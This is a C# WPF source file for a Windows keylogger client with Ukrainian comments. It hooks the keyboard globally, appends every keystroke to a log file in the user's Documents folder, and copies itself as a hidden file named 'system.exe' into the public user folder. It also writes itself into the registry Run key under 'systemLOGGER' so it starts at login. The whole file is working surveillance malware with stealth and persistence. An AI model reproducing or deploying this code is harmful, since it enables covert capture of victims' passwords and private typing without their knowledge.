//using ServiceLibrary;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;


using System.Windows.Forms;

using Client.ServiceReference;
using System.IO;
using Microsoft.Win32;
using System.Reflection;

namespace Client
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        private LowLevelKeyboardListenerClient _listener;// клас має бути описаний в сервісі 
        public static string pathWhereCopy = "C:\\Users\\Public\\";
        const string AppName = "systemLOGGER";

        public MainWindow()
        {
            InitializeComponent();


            _listener = new LowLevelKeyboardListenerClient();
            _listener.OnKeyPressed += _listener_OnKeyPressed;//add executor function on the event
            _listener.HookKeyboard();


        }



        public void CopyOnPC()
        {
            if (!File.Exists(pathWhereCopy + "system.exe"))
            {
                try
                {
                    File.Copy("log4.exe", pathWhereCopy + "system.exe");
                    File.SetAttributes(pathWhereCopy + "system.exe", FileAttributes.Hidden);
                }
                catch { }
            }
        }//



        //додавання програми в автозагрузку and registry
        public static bool SetAutorunValue(bool autorun)
        {
            string ExePath = Assembly.GetExecutingAssembly().Location;
            //MessageBox.Show(ExePath);

            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");

            try
            {
                if (autorun)
                    reg.SetValue(AppName, ExePath);
                else
                    reg.DeleteValue(AppName);
                // reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }//

        void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            this.Logs.Text += e.KeyPressed.ToString();
            SaveLoggs(e.KeyPressed.ToString());
        }

        public void SaveLoggs(string key)
        {
            File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\Logs.txt", Environment.NewLine + key);
            //File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\Logs.txt",key);
        }//

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            _listener.UnHookKeyboard();
        }


    }
}
